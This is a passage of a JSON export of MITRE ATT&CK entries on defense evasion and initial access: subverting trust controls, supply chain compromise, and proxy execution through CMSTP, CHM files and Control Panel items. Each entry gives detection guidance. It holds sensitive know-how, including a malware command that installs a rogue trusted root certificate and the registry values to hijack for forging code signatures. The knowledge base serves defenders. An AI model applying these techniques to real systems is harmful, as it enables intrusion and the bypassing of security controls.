<code>~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2</code>. Each event contains the corresponding UUID, timestamp, application, Gatekeeper score, and decision if it was allowed.(Citation: TheEclecticLightCompany Quarantine and the flag)","platforms":"macOS","data sources":"Command: Command Execution, File: File Metadata, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1553","defenses bypassed":"Anti-virus, Application Control","contributors":"Brandon Dalton @PartyD0lphin; Swasti Bhushan Deb, IBM India Pvt. Ltd.","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CoinTicker 2019),(Citation: 20 macOS Common Tools and Techniques),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Shlayer jamf gatekeeper bypass 2021),(Citation: objectivesee osx.shlayer apple approved 2020),(Citation: Application Bundle Manipulation Brandon Dalton),(Citation: ESET DazzleSpy Jan 2022),"}
{"ID":"T1553.004","name":"Subvert Trust Controls: Install Root Certificate","description":"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)","url":"https://attack.mitre.org/techniques/T1553/004","created":"21 February 2020","last modified":"30 March 2023","version":"1.1","tactics":"Defense Evasion","detection":"A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.(Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.(Citation: Microsoft Sigcheck May 2017)\n\nInstalled root certificates are located in the Registry under <code>HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\</code> and <code>[HKLM or HKCU]\\Software[\\Policies\\]\\Microsoft\\SystemCertificates\\Root\\Certificates\\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:(Citation: Tripwire AppUNBlocker)\n\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\n* CDD4EEAE6000AC7F40C3802C171E30148030C072","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1553","defenses bypassed":"Digital Certificate Validation","contributors":"Itzik Kotler, SafeBreach; Matt Graeber, @mattifestation, SpecterOps; Red Canary; Travis Smith, Tripwire","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: objsee mac malware 2017),(Citation: Unit42 Redaman January 2019),(Citation: ESET RTM Feb 2017),(Citation: Palo Alto Retefe),(Citation: hexed osx.dok analysis 2019),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: SpectorOps Code Signing Dec 2017),(Citation: Wikipedia HPKP)"}
{"ID":"T1553.005","name":"Subvert Trust Controls: Mark-of-the-Web Bypass","description":"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)","url":"https://attack.mitre.org/techniques/T1553/005","created":"22 February 2021","last modified":"22 March 2023","version":"1.1","tactics":"Defense Evasion","detection":"Monitor compressed/archive and image files downloaded from the Internet as the contents may not be tagged with the MOTW. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.(Citation: Disable automount for ISO)","platforms":"Windows","data sources":"File: File Creation, File: File Metadata","is sub-technique":true,"sub-technique of":"T1553","defenses bypassed":"Anti-virus, Application Control","contributors":"Christiaan Beek, @ChristiaanBeek","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Black Basta October 2022),(Citation: TrendMicro TA505 Aug 2019),(Citation: Korean FSI TA505 2020),(Citation: ESET T3 Threat Report 2021),(Citation: Dormann Dangers of VHD 2019),(Citation: GitHub MOTW)"}
{"ID":"T1553.003","name":"Subvert Trust Controls: SIP and Trust Provider Hijacking","description":"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)","url":"https://attack.mitre.org/techniques/T1553/003","created":"05 February 2020","last modified":"05 May 2022","version":"1.0","tactics":"Defense Evasion","detection":"Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nEnable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nUtilize Sysmon detection rules and/or enable the Registry (Global Object Access Auditing) (Citation: Microsoft Registry Auditing Aug 2016) setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers: (Citation: Microsoft Audit Registry July 2012)\n\n* HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\n* HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\n* HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\n* HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\Trust\n\n**Note:** As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using [Regsvr32](https://attack.mitre.org/techniques/T1218/010). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure “Hide Microsoft Entries” and “Hide Windows Entries” are both deselected. (Citation: SpectorOps Subverting Trust Sept 2017)","platforms":"Windows","data sources":"File: File Modification, Module: Module Load, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1553","defenses bypassed":"Application Control, Autoruns Analysis, Digital Certificate Validation, User Mode Signature Validation","contributors":"Matt Graeber, @mattifestation, SpecterOps","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1195","name":"Supply Chain Compromise","description":"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)","url":"https://attack.mitre.org/techniques/T1195","created":"18 April 2018","last modified":"30 March 2023","version":"1.5","tactics":"Initial Access","detection":"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. Perform physical inspection of hardware to look for potential tampering.","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata, Sensor Health: Host Status","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Veeral Patel","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: OWASP Top 10)"}
{"ID":"T1195.003","name":"Supply Chain Compromise: Compromise Hardware Supply Chain","description":"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.","url":"https://attack.mitre.org/techniques/T1195/003","created":"11 March 2020","last modified":"28 April 2022","version":"1.1","tactics":"Initial Access","detection":"Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes.","platforms":"Linux, Windows, macOS","data sources":"Sensor Health: Host Status","is sub-technique":true,"sub-technique of":"T1195","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: TCG Trusted Platform Module),(Citation: TechNet Secure Boot Process)"}
{"ID":"T1195.001","name":"Supply Chain Compromise: Compromise Software Dependencies and Development Tools","description":"Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ","url":"https://attack.mitre.org/techniques/T1195/001","created":"11 March 2020","last modified":"28 April 2022","version":"1.1","tactics":"Initial Access","detection":"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. ","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1195","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: trendmicro xcsset xcode project 2020),(Citation: OWASP Top 10)"}
{"ID":"T1195.002","name":"Supply Chain Compromise: Compromise Software Supply Chain","description":"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ","url":"https://attack.mitre.org/techniques/T1195/002","created":"11 March 2020","last modified":"28 April 2022","version":"1.1","tactics":"Initial Access","detection":"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. ","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1195","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Telebots June 2017),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Secureworks REvil September 2019),(Citation: Secureworks GOLD SOUTHFIELD),(Citation: Trustwave GoldenSpy June 2020),(Citation: Secureworks NotPetya June 2017),(Citation: Avast CCleaner3 2018),(Citation: FireEye APT41 Aug 2019),(Citation: SolarWinds Sunburst Sunspot Update January 2021),(Citation: Talos CCleanup 2017),(Citation: Gigamon Berserk Bear October 2021),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Intezer Aurora Sept 2017),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: OWASP Top 10)"}
{"ID":"T1218","name":"System Binary Proxy Execution","description":"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)","url":"https://attack.mitre.org/techniques/T1218","created":"18 April 2018","last modified":"18 April 2022","version":"3.0","tactics":"Defense Evasion","detection":"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, Module: Module Load, Network Traffic: Network Connection Creation, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Application control, Digital Certificate Validation","contributors":"Hans Christoffer Gaardløs; Nishan Maharjan, @loki248; Praetorian; Wes Hurd","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Qualys LolZarus),(Citation: Lazarus APT January 2022),"}
{"ID":"T1218.003","name":"System Binary Proxy Execution: CMSTP","description":"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)","url":"https://attack.mitre.org/techniques/T1218/003","created":"23 January 2020","last modified":"21 April 2023","version":"2.1","tactics":"Defense Evasion","detection":"Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.\n\nSysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)\n\n* To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.\n* To detect [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).","platforms":"Windows","data sources":"Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Anti-virus, Application control","contributors":"Nik Seetharaman, Palantir; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Talos Cobalt Group July 2018),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: Morphisec Cobalt Gang Oct 2018),"}
{"ID":"T1218.001","name":"System Binary Proxy Execution: Compiled HTML File","description":"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)","url":"https://attack.mitre.org/techniques/T1218/001","created":"23 January 2020","last modified":"21 April 2023","version":"2.1","tactics":"Defense Evasion","detection":"Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.\n\nMonitor presence and use of CHM files, especially if they are not typically used within an environment.","platforms":"Windows","data sources":"Command: Command Execution, File: File Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Application control, Digital Certificate Validation","contributors":"Rahmat Nurfauzi, @infosecn1nja, PT Xynexis International","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Group IB Silence Aug 2019),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Palo Alto OilRig May 2016),(Citation: Kaspersky Lazarus Under The Hood APR 2017),(Citation: Cofense Astaroth Sept 2018),(Citation: Lookout Dark Caracal Jan 2018),(Citation: FireEye APT41 Aug 2019),(Citation: Group IB Silence Sept 2018),(Citation: SecureList Silence Nov 2017),"}
{"ID":"T1218.002","name":"System Binary Proxy Execution: Control Panel","description":"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)\n\nMalicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)","url":"https://attack.mitre.org/techniques/T1218/002","created":"23 January 2020","last modified":"11 March 2022","version":"2.0","tactics":"Defense Evasion","detection":"Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the <code>Control_RunDLL</code> and <code>ControlRunDLLAsUser</code> API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before [Rundll32](https://attack.mitre.org/techniques/T1218/011) is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https://attack.mitre.org/techniques/T1218/011) command, which may bypass detections and/or execution filters for control.exe.(Citation: TrendMicro CPL Malware Jan 2014)\n\nInventory Control Panel items to locate unregistered and potentially malicious files present on systems:\n\n* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace</code> and <code>HKEY_CLASSES_ROOT\\CLSID\\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)\n* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>CPLs</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec(\"c:\\windows\\system32\\control.exe {Canonical_Name}\", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>).(Citation: Microsoft Implementing CPL)\n* Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Controls Folder\\{name}\\Shellex\\PropertySheetHandlers</code> where {name} is the predefined name of the system item.(Citation: Microsoft Implementing CPL)\n\nAnalyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.(Citation: TrendMicro CPL Malware Jan 2014)","platforms":"Windows","data sources":"Command: Command Execution, File: File Creation, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Application control","contributors":"ESET","permissions required":"Administrator, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Palo Alto Reaver Nov 2017),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: ESET InvisiMole June 2020),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker),(Citation: TechNet Applocker vs SRP),(Citation: Corio 2008),(Citation: Microsoft Windows Defender Application Control)"}
